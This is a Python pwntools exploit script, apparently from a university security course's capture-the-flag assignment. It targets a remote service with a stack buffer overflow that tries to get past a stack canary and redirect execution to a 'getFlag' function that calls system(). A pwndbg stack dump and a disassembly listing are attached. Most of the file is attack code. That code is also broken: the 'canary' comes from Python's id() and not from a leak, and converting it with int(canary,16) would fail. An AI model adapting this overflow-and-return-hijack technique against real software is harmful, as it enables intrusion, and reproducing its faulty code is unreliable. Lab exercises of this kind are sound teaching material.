#!/usr/bin/python3

# finding the canary:
# https://ctf101.org/binary-exploitation/stack-canaries/
# https://bananamafia.dev/post/binary-canary-bruteforce/

from pwn import *
from pwn import p64


try:
    for i in range(100):
      io = remote('inf226.puffling.no', 7003)
      print(io.recvuntil(b'1. '))
      s = io.sendline(cyclic(32)+b'\n') # receive the prompt, then send 32 A's
      print(s)
      '''r = io.recvall().removesuffix(b'. ').decode() # is the line received an address of importance? f7f9f600
      print(r)'''
      canary = id(0x7ffff7fb5850)
      print(canary)
      
      

      #r = io.recvall()
      #prompt = b'1. '
      #canary_address = r[r.startswith(prompt) and len(prompt):]
      #canary_address = canary_address.removesuffix(b'. ')
      #print('canary:', canary_address)


      # canary_address = p64(0x7fffffffdff8) # addr. when getting seg. fault
      getFlag_address = 0x4011db # addr. past pushing to stack

      # offset + canary + pad to return pointer + return address of getFlag+5
      send = cyclic(38) + p64(int(canary,16)) #+ cyclic(8) + p64(0x4011db)

      #print(send)
      #io.sendline(send)
      '''response = io.recvall(timeout=2)
      if b'INF226{' in response:
         print(response)
         io.close()
         break
      io.close()'''
except EOFError:
    print('EOFError')


'''
io.send(cyclic(38) + p64(int(canary, 16)) + cyclic(8) + p64(0x40121B)) 
fordi: offset starter på -0x24, cyclic(8) fordi returadressen til getFlag er på 0x08
'''





'''
───────────────────────────────────[ STACK ]───────────────────────────────
00:0000│ rsp 0x7fffffffde90 —▸ 0x7fffffffdff8 —▸ 0x7fffffffe323 ◂— '/home/adneda/Documents/INF226/compulsory_assignments/CA1/03'
01:0008│     0x7fffffffde98 ◂— 0x100000000
02:0010│     0x7fffffffdea0 ◂— 0x736c75706d6f632f ('/compuls')
03:0018│     0x7fffffffdea8 ◂— 0x2
04:0020│     0x7fffffffdeb0 ◂— 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII'
05:0028│     0x7fffffffdeb8 ◂— 'CCCCDDDDEEEEFFFFGGGGHHHHIIII'
06:0030│     0x7fffffffdec0 ◂— 'EEEEFFFFGGGGHHHHIIII'
07:0038│     0x7fffffffdec8 ◂— 'GGGGHHHHIIII'

'''






'''
getFlag return address:

00000000004011d6 <getFlag>:
  4011d6:       f3 0f 1e fa             endbr64
  4011da:       55                      push   %rbp
  4011db:       48 89 e5                mov    %rsp,%rbp
  4011de:       bf 08 20 40 00          mov    $0x402008,%edi
  4011e3:       e8 a8 fe ff ff          call   401090 <puts@plt>
  4011e8:       48 8b 05 51 2e 00 00    mov    0x2e51(%rip),%rax        # 404040 <stdout@GLIBC_2.2.5>
  4011ef:       48 89 c7                mov    %rax,%rdi
  4011f2:       e8 e9 fe ff ff          call   4010e0 <fflush@plt>
  4011f7:       bf 28 20 40 00          mov    $0x402028,%edi
  4011fc:       e8 af fe ff ff          call   4010b0 <system@plt>
  401201:       90                      nop
  401202:       5d                      pop    %rbp
  401203:       c3                      ret

'''


